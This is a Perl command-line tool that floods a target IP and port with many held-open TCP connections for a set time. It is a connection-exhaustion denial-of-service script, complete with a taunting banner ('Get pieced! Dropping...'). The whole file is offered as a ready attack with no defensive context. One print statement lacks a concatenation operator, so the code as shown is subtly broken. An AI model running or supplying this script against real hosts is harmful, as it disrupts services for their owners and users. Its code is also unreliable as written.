#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket::INET;
use Socket qw(:c_socket :tcp);

sub build {
    my ($iaddr, $port, $id) = @_;

    my $socket = IO::Socket::INET->new(
        PeerAddr => $iaddr,
        PeerPort => $port,
        Proto    => 'tcp',
        Timeout  => 5
    ) or do {
        return undef;
    };

    setsockopt($socket, SOL_SOCKET,  SO_KEEPALIVE,  pack("i", 1));
    setsockopt($socket, IPPROTO_TCP, TCP_KEEPIDLE,  pack("i", 15));
    setsockopt($socket, IPPROTO_TCP, TCP_KEEPINTVL, pack("i", 15));
    return $socket;
}

if (@ARGV != 4) {
    die "\r\n\tUsage: perl $0 <ip> <port> <sockets> <time>\r\n\r\n";
}

my ($ip,$port,$num,$time) = @ARGV;

my $iaddr = inet_aton("$ip")
    or die "\r\n\tResolution error.\r\n";

if ($port != 0) {
    $port = 80 if $port < 1 || $port > 65535;
}

$time = 30 if $time < 5 || $time > 3600;

$num = 15 if $num < 5 || $num > 65500;

print "\r\n" x 20;

print <<'EOF';
                 ▄██                
               ▄█████               
              ████████              
             ░░████████             
              ░░████████            
             ▄▄░░████████           
           ▄████░░████████          
          ███████░░████████         
         ░░███████░░████████        
          ░░███████░░████████       
         ▄▄░░███████░░████████      
       ▄████░░███████░░████████     
     ▄███████░░███████░░████████    
    ░▀████████░░███████░░████████   
     ░░░░░░░░░█░█░░░░░░█░░░░░░░░            
            ░░█░▀    ░░█            
    ▄▄ ▄   ▄▄░█ ▄   ▄▄░█   ▄▄ ▄ ▄██▄
  ▄█████ ▄█████░█ ▄█████░▄█████░█░▀█
 ░█▀░░▀█░█▀░░▀█░█░█▀░░▀█░█▀░░▀█░▀█▄ 
░░█  ░░█░█  ░░█░█░█  ░░█░█  ░░█ ░░██
░░█▄ ░▄█░█▄ ░▄█░█░█▄ ░▄█░█▄ ░▄█ █▄░█
░░▀███▀█░░▀██▀█░█░░▀██▀█░░▀██▀█░▀██▀
 ░░░░░░░ ░░░ ░░░ ░░░░░░ ░░░░░░░ ░░
EOF

print "\r\nGet pieced! Dropping " . $ip . ":" . $port " for " . $time . " seconds. CTRL+C to abort...\r\n";

my $quit = time() + $time;

my @sockets;

for my $i (1 .. $num) {
    push @sockets, build($ip, $port, $i);
}

for (;time() <= $quit;) {
    for my $i (0 .. $#sockets) {
        my $sock = $sockets[$i];

        if (!defined $sock || !$sock->opened) {
            $sockets[$i] = build($ip, $port, $i + 1);
        }
    }
    sleep(5);
}

for my $sock (@sockets) {
    if (defined $sock && $sock->opened) {
        close($sock);
    }
}

print "\r\nDone.\r\n\r\n";
exit(0);
